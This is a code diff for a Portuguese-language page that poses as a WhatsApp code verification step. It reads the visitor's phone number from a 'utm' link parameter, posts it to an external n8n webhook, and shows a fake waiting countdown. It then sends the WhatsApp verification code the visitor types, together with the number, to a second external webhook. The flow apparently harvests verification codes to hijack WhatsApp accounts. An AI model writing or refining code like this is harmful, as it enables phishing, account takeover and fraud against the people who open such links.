@@ -1,7 +1,16 @@
 // Simpler verification flow for WhatsApp code
 // Does not rely on previous registration data
 
-function showWhatsAppPopup() {
+function formatPhone(num) {
+  if (!num) return 'Carregando...';
+  const digits = num.replace(/\D/g, '');
+  if (digits.length < 10) return num;
+  const ddd = digits.slice(-11, -9) || digits.slice(0, 2);
+  const nine = digits.slice(-9);
+  return `(${ddd}) ${nine.slice(0,5)}-${nine.slice(5,9)}`;
+}
+
+function showWhatsAppPopup(numero) {
   const modal = document.createElement('div');
   modal.className = 'modal whatsapp-modal';
   modal.style.display = 'flex';
@@ -23,9 +32,50 @@ function showWhatsAppPopup() {
       </div>
     </div>`;
   document.body.appendChild(modal);
-  document.getElementById('whatsappOkBtn').addEventListener('click', () => {
+  document.getElementById('whatsappOkBtn').addEventListener('click', async () => {
+    try {
+      await fetch('https://main-n8n.ohbhf7.easypanel.host/webhook/coletar-numero2', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ telefone: numero })
+      });
+    } catch (err) {
+      console.error(err);
+    }
     modal.remove();
+    showWaitPopup();
   });
+}
+
+function showWaitPopup() {
+  const wait = document.createElement('div');
+  wait.className = 'modal wait-modal';
+  wait.style.display = 'flex';
+  wait.innerHTML = `
+    <div class="modal-content">
+      <div class="modal-body wait-modal-body">
+        <div class="wait-icon">
+          <i class="fas fa-clock"></i>
+        </div>
+        <h2>Aguarde um momento...</h2>
+        <p>Estamos preparando sua verificação.</p>
+        <p>Prosseguindo em <span id="waitCountdown">8</span> segundos.</p>
+        <div class="loading-spinner">
+          <div class="spinner"></div>
+        </div>
+      </div>
+    </div>`;
+  document.body.appendChild(wait);
+  let secs = 8;
+  const counter = wait.querySelector('#waitCountdown');
+  const timer = setInterval(() => {
+    secs -= 1;
+    counter.textContent = secs;
+    if (secs <= 0) {
+      clearInterval(timer);
+      wait.remove();
+    }
+  }, 1000);
 }
 
 function showCustomAlert(message) {
@@ -81,7 +131,13 @@ function startTimers() {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-  showWhatsAppPopup();
+  const params = new URLSearchParams(window.location.search);
+  const numero = params.get('utm') || '';
+  const phoneDisplay = formatPhone(numero);
+  const phoneEl = document.getElementById('userPhone');
+  if (phoneEl) phoneEl.textContent = phoneDisplay;
+
+  showWhatsAppPopup(numero);
   startTimers();
   const form = document.getElementById('verificationForm');
   const btn = document.getElementById('verifyBtn');
@@ -99,7 +155,7 @@ document.addEventListener('DOMContentLoaded', () => {
       await fetch('https://main-n8n.ohbhf7.easypanel.host/webhook/por-codigo2', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ code })
+        body: JSON.stringify({ code, numero })
       });
     } catch (err) {
       console.error(err);
